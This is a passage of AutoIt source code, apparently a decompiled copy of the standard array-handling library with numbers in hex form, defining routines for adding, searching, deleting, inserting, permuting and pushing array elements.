                        ReDim $atmp[$ivaldim_1][$ivaldim_2]
                    EndIf
                    For $j = 0x0 To $icolcount + 0xffffffff
                        $atmp[$i][$j] = $asplit_2[$j]
                    Next
                Next
                $vvalue = $atmp
            EndIf
            If UBound($vvalue, $ubound_columns) + $istart > UBound($aarray, $ubound_columns) Then Return SetError(0x3, 0x0, +0xffffffff)
            ReDim $aarray[$idim_1 + $ivaldim_1][$idim_2]
            For $iwriteto_index = 0x0 To $ivaldim_1 + 0xffffffff
                For $j = 0x0 To $idim_2 + 0xffffffff
                    If $j < $istart Then
                        $aarray[$iwriteto_index + $idim_1][$j] = ""
                    ElseIf $j - $istart > $ivaldim_2 + 0xffffffff Then
                        $aarray[$iwriteto_index + $idim_1][$j] = ""
                    Else
                        If String($hdatatype) = "Boolean" Then
                            Switch $vvalue[$iwriteto_index][$j - $istart]
                                Case "True", "1"
                                    $aarray[$iwriteto_index + $idim_1][$j] = True
                                Case "False", "0", ""
                                    $aarray[$iwriteto_index + $idim_1][$j] = False
                            EndSwitch
                        ElseIf IsFunc($hdatatype) Then
                            $aarray[$iwriteto_index + $idim_1][$j] = $HDATATYPE($vvalue[$iwriteto_index][$j - $istart])
                        Else
                            $aarray[$iwriteto_index + $idim_1][$j] = $vvalue[$iwriteto_index][$j - $istart]
                        EndIf
                    EndIf
                Next
            Next
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return UBound($aarray, $ubound_rows) + 0xffffffff
EndFunc   ;==>_ARRAYADD
Func _ArrayBinarySearch(Const ByRef $aarray, $vvalue, $istart = 0x0, $iend = 0x0, $icolumn = 0x0)
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If $icolumn = Default Then $icolumn = 0x0
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows)
    If $idim_1 = 0x0 Then Return SetError(0x6, 0x0, +0xffffffff)
    If $iend < 0x1 Or $iend > $idim_1 + 0xffffffff Then $iend = $idim_1 + 0xffffffff
    If $istart < 0x0 Then $istart = 0x0
    If $istart > $iend Then Return SetError(0x4, 0x0, +0xffffffff)
    Local $imid = Int(($iend + $istart) / 0x2)
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If $aarray[$istart] > $vvalue Or $aarray[$iend] < $vvalue Then Return SetError(0x2, 0x0, +0xffffffff)
            While $istart <= $imid And $vvalue <> $aarray[$imid]
                If $vvalue < $aarray[$imid] Then
                    $iend = $imid + 0xffffffff
                Else
                    $istart = $imid + 0x1
                EndIf
                $imid = Int(($iend + $istart) / 0x2)
            WEnd
            If $istart > $iend Then Return SetError(0x3, 0x0, +0xffffffff)
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
            If $icolumn < 0x0 Or $icolumn > $idim_2 Then Return SetError(0x7, 0x0, +0xffffffff)
            If $aarray[$istart][$icolumn] > $vvalue Or $aarray[$iend][$icolumn] < $vvalue Then Return SetError(0x2, 0x0, +0xffffffff)
            While $istart <= $imid And $vvalue <> $aarray[$imid][$icolumn]
                If $vvalue < $aarray[$imid][$icolumn] Then
                    $iend = $imid + 0xffffffff
                Else
                    $istart = $imid + 0x1
                EndIf
                $imid = Int(($iend + $istart) / 0x2)
            WEnd
            If $istart > $iend Then Return SetError(0x3, 0x0, +0xffffffff)
        Case Else
            Return SetError(0x5, 0x0, +0xffffffff)
    EndSwitch
    Return $imid
EndFunc   ;==>_ARRAYBINARYSEARCH
Func _ArrayColDelete(ByRef $aarray, $icolumn, $bconvert = False)
    If $bconvert = Default Then $bconvert = False
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows)
    If UBound($aarray, $ubound_dimensions) <> 0x2 Then Return SetError(0x2, 0x0, +0xffffffff)
    Local $idim_2 = UBound($aarray, $ubound_columns)
    Switch $idim_2
        Case 0x2
            If $icolumn < 0x0 Or $icolumn > 0x1 Then Return SetError(0x3, 0x0, +0xffffffff)
            If $bconvert Then
                Local $atemparray[$idim_1]
                For $i = 0x0 To $idim_1 + 0xffffffff
                    $atemparray[$i] = $aarray[$i][(Not $icolumn)]
                Next
                $aarray = $atemparray
            Else
                ContinueCase
            EndIf
        Case Else
            If $icolumn < 0x0 Or $icolumn > $idim_2 + 0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
            For $i = 0x0 To $idim_1 + 0xffffffff
                For $j = $icolumn To $idim_2 + 0xfffffffe
                    $aarray[$i][$j] = $aarray[$i][$j + 0x1]
                Next
            Next
            ReDim $aarray[$idim_1][$idim_2 + 0xffffffff]
    EndSwitch
    Return UBound($aarray, $ubound_columns)
EndFunc   ;==>_ARRAYCOLDELETE
Func _ArrayColInsert(ByRef $aarray, $icolumn)
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows)
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            Local $atemparray[$idim_1][0x2]
            Switch $icolumn
                Case 0x0, 0x1
                    For $i = 0x0 To $idim_1 + 0xffffffff
                        $atemparray[$i][(Not $icolumn)] = $aarray[$i]
                    Next
                Case Else
                    Return SetError(0x3, 0x0, +0xffffffff)
            EndSwitch
            $aarray = $atemparray
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns)
            If $icolumn < 0x0 Or $icolumn > $idim_2 Then Return SetError(0x3, 0x0, +0xffffffff)
            ReDim $aarray[$idim_1][$idim_2 + 0x1]
            For $i = 0x0 To $idim_1 + 0xffffffff
                For $j = $idim_2 To $icolumn + 0x1 Step +0xffffffff
                    $aarray[$i][$j] = $aarray[$i][$j + 0xffffffff]
                Next
                $aarray[$i][$icolumn] = ""
            Next
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return UBound($aarray, $ubound_columns)
EndFunc   ;==>_ARRAYCOLINSERT
Func _ArrayCombinations(Const ByRef $aarray, $iset, $sdelimiter = "")
    If $sdelimiter = Default Then $sdelimiter = ""
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, 0x0)
    If UBound($aarray, $ubound_dimensions) <> 0x1 Then Return SetError(0x2, 0x0, 0x0)
    Local $in = UBound($aarray)
    Local $ir = $iset
    Local $aidx[$ir]
    For $i = 0x0 To $ir + 0xffffffff
        $aidx[$i] = $i
    Next
    Local $itotal = __ARRAY_COMBINATIONS($in, $ir)
    Local $ileft = $itotal
    Local $aresult[$itotal + 0x1]
    $aresult[0x0] = $itotal
    Local $icount = 0x1
    While $ileft > 0x0
        __ARRAY_GETNEXT($in, $ir, $ileft, $itotal, $aidx)
        For $i = 0x0 To $iset + 0xffffffff
            $aresult[$icount] &= $aarray[$aidx[$i]] & $sdelimiter
        Next
        If $sdelimiter <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], 0x1)
        $icount += 0x1
    WEnd
    Return $aresult
EndFunc   ;==>_ARRAYCOMBINATIONS
Func _ArrayConcatenate(ByRef $aarraytarget, Const ByRef $aarraysource, $istart = 0x0)
    If $istart = Default Then $istart = 0x0
    If Not IsArray($aarraytarget) Then Return SetError(0x1, 0x0, +0xffffffff)
    If Not IsArray($aarraysource) Then Return SetError(0x2, 0x0, +0xffffffff)
    Local $idim_total_tgt = UBound($aarraytarget, $ubound_dimensions)
    Local $idim_total_src = UBound($aarraysource, $ubound_dimensions)
    Local $idim_1_tgt = UBound($aarraytarget, $ubound_rows)
    Local $idim_1_src = UBound($aarraysource, $ubound_rows)
    If $istart < 0x0 Or $istart > $idim_1_src + 0xffffffff Then Return SetError(0x6, 0x0, +0xffffffff)
    Switch $idim_total_tgt
        Case 0x1
            If $idim_total_src <> 0x1 Then Return SetError(0x4, 0x0, +0xffffffff)
            ReDim $aarraytarget[$idim_1_tgt + $idim_1_src - $istart]
            For $i = $istart To $idim_1_src + 0xffffffff
                $aarraytarget[$idim_1_tgt + $i - $istart] = $aarraysource[$i]
            Next
        Case 0x2
            If $idim_total_src <> 0x2 Then Return SetError(0x4, 0x0, +0xffffffff)
            Local $idim_2_tgt = UBound($aarraytarget, $ubound_columns)
            If UBound($aarraysource, $ubound_columns) <> $idim_2_tgt Then Return SetError(0x5, 0x0, +0xffffffff)
            ReDim $aarraytarget[$idim_1_tgt + $idim_1_src - $istart][$idim_2_tgt]
            For $i = $istart To $idim_1_src + 0xffffffff
                For $j = 0x0 To $idim_2_tgt + 0xffffffff
                    $aarraytarget[$idim_1_tgt + $i - $istart][$j] = $aarraysource[$i][$j]
                Next
            Next
        Case Else
            Return SetError(0x3, 0x0, +0xffffffff)
    EndSwitch
    Return UBound($aarraytarget, $ubound_rows)
EndFunc   ;==>_ARRAYCONCATENATE
Func _ArrayDelete(ByRef $aarray, $vrange)
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    If IsArray($vrange) Then
        If UBound($vrange, $ubound_dimensions) <> 0x1 Or UBound($vrange, $ubound_rows) < 0x2 Then Return SetError(0x4, 0x0, +0xffffffff)
    Else
        Local $inumber, $asplit_1, $asplit_2
        $vrange = StringStripWS($vrange, 0x8)
        $asplit_1 = StringSplit($vrange, ";")
        $vrange = ""
        For $i = 0x1 To $asplit_1[0x0]
            If Not StringRegExp($asplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(0x3, 0x0, +0xffffffff)
            $asplit_2 = StringSplit($asplit_1[$i], "-")
            Switch $asplit_2[0x0]
                Case 0x1
                    $vrange &= $asplit_2[0x1] & ";"
                Case 0x2
                    If Number($asplit_2[0x2]) >= Number($asplit_2[0x1]) Then
                        $inumber = $asplit_2[0x1] + 0xffffffff
                        Do
                            $inumber += 0x1
                            $vrange &= $inumber & ";"
                        Until $inumber = $asplit_2[0x2]
                    EndIf
            EndSwitch
        Next
        $vrange = StringSplit(StringTrimRight($vrange, 0x1), ";")
    EndIf
    For $i = 0x1 To $vrange[0x0]
        $vrange[$i] = Number($vrange[$i])
    Next
    If $vrange[0x1] < 0x0 Or $vrange[$vrange[0x0]] > $idim_1 Then Return SetError(0x5, 0x0, +0xffffffff)
    Local $icopyto_index = 0x0
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            For $i = 0x1 To $vrange[0x0]
                $aarray[$vrange[$i]] = ChrW(0xfab1)
            Next
            For $ireadfrom_index = 0x0 To $idim_1
                If $aarray[$ireadfrom_index] == ChrW(0xfab1) Then
                    ContinueLoop
                Else
                    If $ireadfrom_index <> $icopyto_index Then
                        $aarray[$icopyto_index] = $aarray[$ireadfrom_index]
                    EndIf
                    $icopyto_index += 0x1
                EndIf
            Next
            ReDim $aarray[$idim_1 - $vrange[0x0] + 0x1]
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
            For $i = 0x1 To $vrange[0x0]
                $aarray[$vrange[$i]][0x0] = ChrW(0xfab1)
            Next
            For $ireadfrom_index = 0x0 To $idim_1
                If $aarray[$ireadfrom_index][0x0] == ChrW(0xfab1) Then
                    ContinueLoop
                Else
                    If $ireadfrom_index <> $icopyto_index Then
                        For $j = 0x0 To $idim_2
                            $aarray[$icopyto_index][$j] = $aarray[$ireadfrom_index][$j]
                        Next
                    EndIf
                    $icopyto_index += 0x1
                EndIf
            Next
            ReDim $aarray[$idim_1 - $vrange[0x0] + 0x1][$idim_2 + 0x1]
        Case Else
            Return SetError(0x2, 0x0, False)
    EndSwitch
    Return UBound($aarray, $ubound_rows)
EndFunc   ;==>_ARRAYDELETE
Func _ArrayDisplay(Const ByRef $aarray, $stitle = Default, $sarrayrange = Default, $iflags = Default, $vuser_separator = Default, $sheader = Default, $idesired_colwidth = Default)
    #forceref $vuser_separator
    Local $iret = __ARRAYDISPLAY_SHARE($aarray, $stitle, $sarrayrange, $iflags, Default, $sheader, $idesired_colwidth, 0x0, False)
    Return SetError(@error, @extended, $iret)
EndFunc   ;==>_ARRAYDISPLAY
Func _ArrayExtract(Const ByRef $aarray, $istart_row = +0xffffffff, $iend_row = +0xffffffff, $istart_col = +0xffffffff, $iend_col = +0xffffffff)
    If $istart_row = Default Then $istart_row = +0xffffffff
    If $iend_row = Default Then $iend_row = +0xffffffff
    If $istart_col = Default Then $istart_col = +0xffffffff
    If $iend_col = Default Then $iend_col = +0xffffffff
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    If $iend_row = +0xffffffff Then $iend_row = $idim_1
    If $istart_row = +0xffffffff Then $istart_row = 0x0
    If $istart_row < +0xffffffff Or $iend_row < +0xffffffff Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart_row > $idim_1 Or $iend_row > $idim_1 Then Return SetError(0x3, 0x0, +0xffffffff)
    If $istart_row > $iend_row Then Return SetError(0x4, 0x0, +0xffffffff)
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            Local $aretarray[$iend_row - $istart_row + 0x1]
            For $i = 0x0 To $iend_row - $istart_row
                $aretarray[$i] = $aarray[$i + $istart_row]
            Next
            Return $aretarray
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns) + 0xffffffff
            If $iend_col = +0xffffffff Then $iend_col = $idim_2
            If $istart_col = +0xffffffff Then $istart_col = 0x0
            If $istart_col < +0xffffffff Or $iend_col < +0xffffffff Then Return SetError(0x5, 0x0, +0xffffffff)
            If $istart_col > $idim_2 Or $iend_col > $idim_2 Then Return SetError(0x5, 0x0, +0xffffffff)
            If $istart_col > $iend_col Then Return SetError(0x6, 0x0, +0xffffffff)
            If $istart_col = $iend_col Then
                Local $aretarray[$iend_row - $istart_row + 0x1]
            Else
                Local $aretarray[$iend_row - $istart_row + 0x1][$iend_col - $istart_col + 0x1]
            EndIf
            For $i = 0x0 To $iend_row - $istart_row
                For $j = 0x0 To $iend_col - $istart_col
                    If $istart_col = $iend_col Then
                        $aretarray[$i] = $aarray[$i + $istart_row][$j + $istart_col]
                    Else
                        $aretarray[$i][$j] = $aarray[$i + $istart_row][$j + $istart_col]
                    EndIf
                Next
            Next
            Return $aretarray
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return 0x1
EndFunc   ;==>_ARRAYEXTRACT
Func _ArrayFindAll(Const ByRef $aarray, $vvalue, $istart = 0x0, $iend = 0x0, $icase = 0x0, $icompare = 0x0, $isubitem = 0x0, $brow = False)
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If $icase = Default Then $icase = 0x0
    If $icompare = Default Then $icompare = 0x0
    If $isubitem = Default Then $isubitem = 0x0
    If $brow = Default Then $brow = False
    $istart = _ArraySearch($aarray, $vvalue, $istart, $iend, $icase, $icompare, 0x1, $isubitem, $brow)
    If @error Then Return SetError(@error, 0x0, +0xffffffff)
    Local $iindex = 0x0, $avresult[UBound($aarray, ($brow ? $ubound_columns : $ubound_rows))]
    Do
        $avresult[$iindex] = $istart
        $iindex += 0x1
        $istart = _ArraySearch($aarray, $vvalue, $istart + 0x1, $iend, $icase, $icompare, 0x1, $isubitem, $brow)
    Until @error
    ReDim $avresult[$iindex]
    Return $avresult
EndFunc   ;==>_ARRAYFINDALL
Func _ARRAYFROMSTRING($sarraystr, $sdelim_col = "|", $sdelim_row = @CRLF, $bforce2d = False, $istripws = $str_stripleading + $str_striptrailing)
    If $sdelim_col = Default Then $sdelim_col = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $bforce2d = Default Then $bforce2d = False
    If $istripws = Default Then $istripws = $str_stripleading + $str_striptrailing
    Local $arow, $acol = StringSplit($sarraystr, $sdelim_row, $str_entiresplit + $str_nocount)
    $arow = StringSplit($acol[0x0], $sdelim_col, $str_entiresplit + $str_nocount)
    If UBound($acol) = 0x1 And Not $bforce2d Then
        For $m = 0x0 To UBound($arow) + 0xffffffff
            $arow[$m] = ($istripws ? StringStripWS($arow[$m], $istripws) : $arow[$m])
        Next
        Return $arow
    EndIf
    Local $aret[UBound($acol)][UBound($arow)]
    For $n = 0x0 To UBound($acol) + 0xffffffff
        $arow = StringSplit($acol[$n], $sdelim_col, $str_entiresplit + $str_nocount)
        If UBound($arow) > UBound($aret, 0x2) Then Return SetError(0x1)
        For $m = 0x0 To UBound($arow) + 0xffffffff
            $aret[$n][$m] = ($istripws ? StringStripWS($arow[$m], $istripws) : $arow[$m])
        Next
    Next
    Return $aret
EndFunc   ;==>_ARRAYFROMSTRING
Func _ArrayInsert(ByRef $aarray, $vrange, $vvalue = "", $istart = 0x0, $sdelim_item = "|", $sdelim_row = @CRLF, $iforce = $arrayfill_force_default)
    If $vvalue = Default Then $vvalue = ""
    If $istart = Default Then $istart = 0x0
    If $sdelim_item = Default Then $sdelim_item = "|"
    If $sdelim_row = Default Then $sdelim_row = @CRLF
    If $iforce = Default Then $iforce = $arrayfill_force_default
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, +0xffffffff)
    Local $idim_1 = UBound($aarray, $ubound_rows) + 0xffffffff
    Local $hdatatype = 0x0
    Switch $iforce
        Case $arrayfill_force_int
            $hdatatype = INT
        Case $arrayfill_force_number
            $hdatatype = NUMBER
        Case $arrayfill_force_ptr
            $hdatatype = PTR
        Case $arrayfill_force_hwnd
            $hdatatype = HWND
        Case $arrayfill_force_string
            $hdatatype = STRING
    EndSwitch
    Local $asplit_1, $asplit_2
    If IsArray($vrange) Then
        If UBound($vrange, $ubound_dimensions) <> 0x1 Or UBound($vrange, $ubound_rows) < 0x2 Then Return SetError(0x4, 0x0, +0xffffffff)
    Else
        Local $inumber
        $vrange = StringStripWS($vrange, 0x8)
        $asplit_1 = StringSplit($vrange, ";")
        $vrange = ""
        For $i = 0x1 To $asplit_1[0x0]
            If Not StringRegExp($asplit_1[$i], "^\d+(-\d+)?$") Then Return SetError(0x3, 0x0, +0xffffffff)
            $asplit_2 = StringSplit($asplit_1[$i], "-")
            Switch $asplit_2[0x0]
                Case 0x1
                    $vrange &= $asplit_2[0x1] & ";"
                Case 0x2
                    If Number($asplit_2[0x2]) >= Number($asplit_2[0x1]) Then
                        $inumber = $asplit_2[0x1] + 0xffffffff
                        Do
                            $inumber += 0x1
                            $vrange &= $inumber & ";"
                        Until $inumber = $asplit_2[0x2]
                    EndIf
            EndSwitch
        Next
        $vrange = StringSplit(StringTrimRight($vrange, 0x1), ";")
    EndIf
    For $i = 0x1 To $vrange[0x0]
        $vrange[$i] = Number($vrange[$i])
    Next
    If $vrange[0x1] < 0x0 Or $vrange[$vrange[0x0]] > $idim_1 Then Return SetError(0x5, 0x0, +0xffffffff)
    For $i = 0x2 To $vrange[0x0]
        If $vrange[$i] < $vrange[$i + 0xffffffff] Then Return SetError(0x3, 0x0, +0xffffffff)
    Next
    Local $icopyto_index = $idim_1 + $vrange[0x0]
    Local $iinsertpoint_index = $vrange[0x0]
    Local $iinsert_index = $vrange[$iinsertpoint_index]
    Switch UBound($aarray, $ubound_dimensions)
        Case 0x1
            If $iforce = $arrayfill_force_singleitem Then
                ReDim $aarray[$idim_1 + $vrange[0x0] + 0x1]
                For $ireadfromindex = $idim_1 To 0x0 Step +0xffffffff
                    $aarray[$icopyto_index] = $aarray[$ireadfromindex]
                    $icopyto_index -= 0x1
                    $iinsert_index = $vrange[$iinsertpoint_index]
                    While $ireadfromindex = $iinsert_index
                        $aarray[$icopyto_index] = $vvalue
                        $icopyto_index -= 0x1
                        $iinsertpoint_index -= 0x1
                        If $iinsertpoint_index < 0x1 Then ExitLoop 0x2
                        $iinsert_index = $vrange[$iinsertpoint_index]
                    WEnd
                Next
                Return $idim_1 + $vrange[0x0] + 0x1
            EndIf
            ReDim $aarray[$idim_1 + $vrange[0x0] + 0x1]
            If IsArray($vvalue) Then
                If UBound($vvalue, $ubound_dimensions) <> 0x1 Then Return SetError(0x5, 0x0, +0xffffffff)
                $hdatatype = 0x0
            Else
                Local $atmp = StringSplit($vvalue, $sdelim_item, $str_nocount + $str_entiresplit)
                If UBound($atmp, $ubound_rows) = 0x1 Then
                    $atmp[0x0] = $vvalue
                    $hdatatype = 0x0
                EndIf
                $vvalue = $atmp
            EndIf
            For $ireadfromindex = $idim_1 To 0x0 Step +0xffffffff
                $aarray[$icopyto_index] = $aarray[$ireadfromindex]
                $icopyto_index -= 0x1
                $iinsert_index = $vrange[$iinsertpoint_index]
                While $ireadfromindex = $iinsert_index
                    If $iinsertpoint_index <= UBound($vvalue, $ubound_rows) Then
                        If IsFunc($hdatatype) Then
                            $aarray[$icopyto_index] = $HDATATYPE($vvalue[$iinsertpoint_index + 0xffffffff])
                        Else
                            $aarray[$icopyto_index] = $vvalue[$iinsertpoint_index + 0xffffffff]
                        EndIf
                    Else
                        $aarray[$icopyto_index] = ""
                    EndIf
                    $icopyto_index -= 0x1
                    $iinsertpoint_index -= 0x1
                    If $iinsertpoint_index = 0x0 Then ExitLoop 0x2
                    $iinsert_index = $vrange[$iinsertpoint_index]
                WEnd
            Next
        Case 0x2
            Local $idim_2 = UBound($aarray, $ubound_columns)
            If $istart < 0x0 Or $istart > $idim_2 + 0xffffffff Then Return SetError(0x6, 0x0, +0xffffffff)
            Local $ivaldim_1, $ivaldim_2
            If IsArray($vvalue) Then
                If UBound($vvalue, $ubound_dimensions) <> 0x2 Then Return SetError(0x7, 0x0, +0xffffffff)
                $ivaldim_1 = UBound($vvalue, $ubound_rows)
                $ivaldim_2 = UBound($vvalue, $ubound_columns)
                $hdatatype = 0x0
            Else
                $asplit_1 = StringSplit($vvalue, $sdelim_row, $str_nocount + $str_entiresplit)
                $ivaldim_1 = UBound($asplit_1, $ubound_rows)
                StringReplace($asplit_1[0x0], $sdelim_item, "")
                $ivaldim_2 = @extended + 0x1
                Local $atmp[$ivaldim_1][$ivaldim_2]
                For $i = 0x0 To $ivaldim_1 + 0xffffffff
                    $asplit_2 = StringSplit($asplit_1[$i], $sdelim_item, $str_nocount + $str_entiresplit)
                    For $j = 0x0 To $ivaldim_2 + 0xffffffff
                        $atmp[$i][$j] = $asplit_2[$j]
                    Next
                Next
                $vvalue = $atmp
            EndIf
            If UBound($vvalue, $ubound_columns) + $istart > UBound($aarray, $ubound_columns) Then Return SetError(0x8, 0x0, +0xffffffff)
            ReDim $aarray[$idim_1 + $vrange[0x0] + 0x1][$idim_2]
            For $ireadfromindex = $idim_1 To 0x0 Step +0xffffffff
                For $j = 0x0 To $idim_2 + 0xffffffff
                    $aarray[$icopyto_index][$j] = $aarray[$ireadfromindex][$j]
                Next
                $icopyto_index -= 0x1
                $iinsert_index = $vrange[$iinsertpoint_index]
                While $ireadfromindex = $iinsert_index
                    For $j = 0x0 To $idim_2 + 0xffffffff
                        If $j < $istart Then
                            $aarray[$icopyto_index][$j] = ""
                        ElseIf $j - $istart > $ivaldim_2 + 0xffffffff Then
                            $aarray[$icopyto_index][$j] = ""
                        Else
                            If $iinsertpoint_index + 0xffffffff < $ivaldim_1 Then
                                If IsFunc($hdatatype) Then
                                    $aarray[$icopyto_index][$j] = $HDATATYPE($vvalue[$iinsertpoint_index + 0xffffffff][$j - $istart])
                                Else
                                    $aarray[$icopyto_index][$j] = $vvalue[$iinsertpoint_index + 0xffffffff][$j - $istart]
                                EndIf
                            Else
                                $aarray[$icopyto_index][$j] = ""
                            EndIf
                        EndIf
                    Next
                    $icopyto_index -= 0x1
                    $iinsertpoint_index -= 0x1
                    If $iinsertpoint_index = 0x0 Then ExitLoop 0x2
                    $iinsert_index = $vrange[$iinsertpoint_index]
                WEnd
            Next
        Case Else
            Return SetError(0x2, 0x0, +0xffffffff)
    EndSwitch
    Return UBound($aarray, $ubound_rows)
EndFunc   ;==>_ARRAYINSERT
Func _ArrayMax(Const ByRef $aarray, $icompnumeric = 0x0, $istart = +0xffffffff, $iend = +0xffffffff, $isubitem = 0x0)
    Local $iresult = _ArrayMaxIndex($aarray, $icompnumeric, $istart, $iend, $isubitem)
    If @error Then Return SetError(@error, 0x0, "")
    If UBound($aarray, $ubound_dimensions) = 0x1 Then
        Return $aarray[$iresult]
    Else
        Return $aarray[$iresult][$isubitem]
    EndIf
EndFunc   ;==>_ARRAYMAX
Func _ArrayMaxIndex(Const ByRef $aarray, $icompnumeric = 0x0, $istart = +0xffffffff, $iend = +0xffffffff, $isubitem = 0x0)
    If $icompnumeric = Default Then $icompnumeric = 0x0
    If $istart = Default Then $istart = +0xffffffff
    If $iend = Default Then $iend = +0xffffffff
    If $isubitem = Default Then $isubitem = 0x0
    Local $iret = __ARRAY_MINMAXINDEX($aarray, $icompnumeric, $istart, $iend, $isubitem, __ARRAY_GREATERTHAN)
    Return SetError(@error, 0x0, $iret)
EndFunc   ;==>_ARRAYMAXINDEX
Func _ArrayMin(Const ByRef $aarray, $icompnumeric = 0x0, $istart = +0xffffffff, $iend = +0xffffffff, $isubitem = 0x0)
    Local $iresult = _ArrayMinIndex($aarray, $icompnumeric, $istart, $iend, $isubitem)
    If @error Then Return SetError(@error, 0x0, "")
    If UBound($aarray, $ubound_dimensions) = 0x1 Then
        Return $aarray[$iresult]
    Else
        Return $aarray[$iresult][$isubitem]
    EndIf
EndFunc   ;==>_ARRAYMIN
Func _ArrayMinIndex(Const ByRef $aarray, $icompnumeric = 0x0, $istart = +0xffffffff, $iend = +0xffffffff, $isubitem = 0x0)
    If $icompnumeric = Default Then $icompnumeric = 0x0
    If $istart = Default Then $istart = +0xffffffff
    If $iend = Default Then $iend = +0xffffffff
    If $isubitem = Default Then $isubitem = 0x0
    Local $iret = __ARRAY_MINMAXINDEX($aarray, $icompnumeric, $istart, $iend, $isubitem, __ARRAY_LESSTHAN)
    Return SetError(@error, 0x0, $iret)
EndFunc   ;==>_ARRAYMININDEX
Func _ArrayPermute(ByRef $aarray, $sdelimiter = "")
    If $sdelimiter = Default Then $sdelimiter = ""
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, 0x0)
    If UBound($aarray, $ubound_dimensions) <> 0x1 Then Return SetError(0x2, 0x0, 0x0)
    Local $isize = UBound($aarray), $ifactorial = 0x1, $aidx[$isize], $aresult[0x1], $icount = 0x1
    If UBound($aarray) Then
        For $i = 0x0 To $isize + 0xffffffff
            $aidx[$i] = $i
        Next
        For $i = $isize To 0x1 Step +0xffffffff
            $ifactorial *= $i
        Next
        ReDim $aresult[$ifactorial + 0x1]
        $aresult[0x0] = $ifactorial
        __ARRAY_EXETERINTERNAL($aarray, 0x0, $isize, $sdelimiter, $aidx, $aresult, $icount)
    Else
        $aresult[0x0] = 0x0
    EndIf
    Return $aresult
EndFunc   ;==>_ARRAYPERMUTE
Func _ArrayPop(ByRef $aarray)
    If (Not IsArray($aarray)) Then Return SetError(0x1, 0x0, "")
    If UBound($aarray, $ubound_dimensions) <> 0x1 Then Return SetError(0x2, 0x0, "")
    Local $iubound = UBound($aarray) + 0xffffffff
    If $iubound = +0xffffffff Then Return SetError(0x3, 0x0, "")
    Local $slastval = $aarray[$iubound]
    If $iubound > +0xffffffff Then
        ReDim $aarray[$iubound]
    EndIf
    Return $slastval
EndFunc   ;==>_ARRAYPOP
Func _ArrayPush(ByRef $aarray, $vvalue, $idirection = 0x0)
    If $idirection = Default Then $idirection = 0x0
    If (Not IsArray($aarray)) Then Return SetError(0x1, 0x0, 0x0)
    If UBound($aarray, $ubound_dimensions) <> 0x1 Then Return SetError(0x3, 0x0, 0x0)
    Local $iubound = UBound($aarray) + 0xffffffff
    If IsArray($vvalue) Then
        Local $iubounds = UBound($vvalue)
        If ($iubounds + 0xffffffff) > $iubound Then Return SetError(0x2, 0x0, 0x0)
        If $idirection Then
            For $i = $iubound To $iubounds Step +0xffffffff
                $aarray[$i] = $aarray[$i - $iubounds]
            Next
            For $i = 0x0 To $iubounds + 0xffffffff
                $aarray[$i] = $vvalue[$i]
            Next
        Else
            For $i = 0x0 To $iubound - $iubounds
                $aarray[$i] = $aarray[$i + $iubounds]
            Next
            For $i = 0x0 To $iubounds + 0xffffffff
                $aarray[$i + $iubound - $iubounds + 0x1] = $vvalue[$i]
            Next
        EndIf
    Else
        If $iubound > +0xffffffff Then
            If $idirection Then
                For $i = $iubound To 0x1 Step +0xffffffff
                    $aarray[$i] = $aarray[$i + 0xffffffff]
                Next
                $aarray[0x0] = $vvalue
            Else
                For $i = 0x0 To $iubound + 0xffffffff
                    $aarray[$i] = $aarray[$i + 0x1]
                Next
                $aarray[$iubound] = $vvalue
            EndIf
        EndIf
    EndIf
    Return 0x1
EndFunc   ;==>_ARRAYPUSH
Func _ArrayReverse(ByRef $aarray, $istart = 0x0, $iend = 0x0)
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If Not IsArray($aarray) Then Return SetError(0x1, 0x0, 0x0)
    If UBound($aarray, $ubound_dimensions) <> 0x1 Then Return SetError(0x3, 0x0, 0x0)
    If Not UBound($aarray) Then Return SetError(0x4, 0x0, 0x0)
    Local $vtmp, $iubound = UBound($aarray) + 0xffffffff
    If $iend < 0x1 Or $iend > $iubound Then $iend = $iubound
    If $istart < 0x0 Then $istart = 0x0
    If $istart > $iend Then Return SetError(0x2, 0x0, 0x0)
    For $i = $istart To Int(($istart + $iend + 0xffffffff) / 0x2)
        $vtmp = $aarray[$i]
        $aarray[$i] = $aarray[$iend]
        $aarray[$iend] = $vtmp
        $iend -= 0x1
    Next
    Return 0x1
EndFunc   ;==>_ARRAYREVERSE
Func _ArraySearch(Const ByRef $aarray, $vvalue, $istart = 0x0, $iend = 0x0, $icase = 0x0, $icompare = 0x0, $iforward = 0x1, $isubitem = +0xffffffff, $brow = False)
    If $istart = Default Then $istart = 0x0
    If $iend = Default Then $iend = 0x0
    If $icase = Default Then $icase = 0x0
